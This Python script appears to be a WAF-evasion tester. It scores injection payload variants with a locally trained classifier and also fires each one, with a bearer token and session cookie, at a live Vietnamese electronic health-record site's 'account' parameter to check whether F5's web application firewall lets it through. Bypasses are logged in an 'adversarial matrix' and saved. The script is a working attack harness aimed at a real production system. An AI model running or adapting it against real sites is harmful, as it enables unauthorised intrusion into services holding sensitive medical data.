import json
import sys
import time
from pathlib import Path
from urllib.parse import quote

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
from predict import predict_request, load_model
from train import payload_to_request

from evasion.curl_bypass_f5 import (
    BASE_URL,
    BEARER,
    COOKIE,
    RAW_PAYLOAD,
    variants_f5,
)

try:
    import requests
except ImportError:
    print("pip install requests")
    sys.exit(1)

DATA_DIR = Path(__file__).resolve().parent.parent / "data"
MODEL_PATH = Path(__file__).resolve().parent.parent / "models" / "waf_model.joblib"
OUT_ADVERSARIAL = DATA_DIR / "adversarial_report.jsonl"
HEADERS = {
    "Accept": "application/json, text/plain, */*",
    "Authorization": f"Bearer {BEARER}",
    "Origin": "https://ybadientu.hososuckhoe.vn",
    "Referer": "https://ybadientu.hososuckhoe.vn/",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}
if COOKIE:
    HEADERS["Cookie"] = COOKIE


def is_f5_bypass(resp) -> bool:
    if resp.status_code != 200:
        return False
    text = (resp.text or "").lower()
    for p in ["request rejected", "access forbidden", "request blocked", "blocked by", "access denied"]:
        if p in text:
            return False
    if '"blocked":true' in text or '"rejected":true' in text:
        return False
    return True


def load_payloads(source: str) -> list[tuple[str, str]]:
    out = []
    if source == "variants":
        out = variants_f5(RAW_PAYLOAD)
    elif source == "bypass_learned":
        path = DATA_DIR / "bypass_learned.jsonl"
        if path.exists():
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    o = json.loads(line)
                    out.append((o["payload"], o.get("name", "saved")))
    elif source == "bypass_found":
        path = DATA_DIR / "bypass_found.txt"
        if path.exists():
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if "\t" in line:
                        name, payload = line.split("\t", 1)
                        out.append((payload, name))
    elif source == "blocked_learned":
        path = DATA_DIR / "blocked_learned.jsonl"
        if path.exists():
            with open(path, "r", encoding="utf-8") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    o = json.loads(line)
                    out.append((o["payload"], o.get("name", "blocked")))
    return out


def build_url(payload: str) -> str:
    q = quote(payload, safe="") if not payload.startswith("36331%") else payload
    return f"{BASE_URL}?account={q}"


def run(source: str = "variants", limit: int = 0, skip_f5: bool = False):
    if not MODEL_PATH.exists():
        print("Run train.py first.", file=sys.stderr)
        sys.exit(1)

    payloads = load_payloads(source)
    if not payloads:
        print(f"No payloads from source={source}")
        return

    if limit > 0:
        payloads = payloads[:limit]

    model, _ = load_model()
    matrix = {"local_block_f5_block": [], "local_block_f5_bypass": [], "local_bypass_f5_block": [], "local_bypass_f5_bypass": []}

    with open(OUT_ADVERSARIAL, "w", encoding="utf-8"):
        pass

    for i, (payload, name) in enumerate(payloads):
        req = payload_to_request(payload, "account")
        pred, score = predict_request(req, model)
        local_bypass = pred == 0

        f5_bypass = None
        if not skip_f5:
            try:
                url = build_url(payload)
                r = requests.get(url, headers=HEADERS, timeout=12)
                f5_bypass = is_f5_bypass(r)
            except requests.RequestException:
                f5_bypass = None

        if f5_bypass is not None:
            key = "local_block_f5_block" if not local_bypass and not f5_bypass else \
                  "local_block_f5_bypass" if not local_bypass and f5_bypass else \
                  "local_bypass_f5_block" if local_bypass and not f5_bypass else "local_bypass_f5_bypass"
            matrix[key].append({"payload": payload[:200], "name": name, "score": round(score, 4)})

        row = {"payload": payload[:200], "name": name, "local": "bypass" if local_bypass else "block", "local_score": round(score, 4)}
        if f5_bypass is not None:
            row["f5"] = "bypass" if f5_bypass else "block"
        with open(OUT_ADVERSARIAL, "a", encoding="utf-8") as f:
            f.write(json.dumps(row, ensure_ascii=False) + "\n")

        f5_str = "f5=?" if f5_bypass is None else ("f5=bypass" if f5_bypass else "f5=block")
        print(f"[{i+1}] {name[:24]:24} local={'bypass' if local_bypass else 'block'} {f5_str} score={score:.3f}")

        if not skip_f5:
            time.sleep(0.3)

    print("\n--- Adversarial matrix ---")
    for k, items in matrix.items():
        print(f"  {k}: {len(items)}")
    print(f"\nAdversarial (local_bypass_f5_block): F5 catches but our model misses - add to training")
    print(f"Report appended to {OUT_ADVERSARIAL}")


if __name__ == "__main__":
    source = "variants"
    limit = 0
    skip_f5 = "--no-f5" in sys.argv
    for a in sys.argv[1:]:
        if a in ("variants", "bypass_learned", "bypass_found", "blocked_learned"):
            source = a
        elif a.startswith("--limit="):
            limit = int(a.split("=")[1])
    run(source=source, limit=limit, skip_f5=skip_f5)
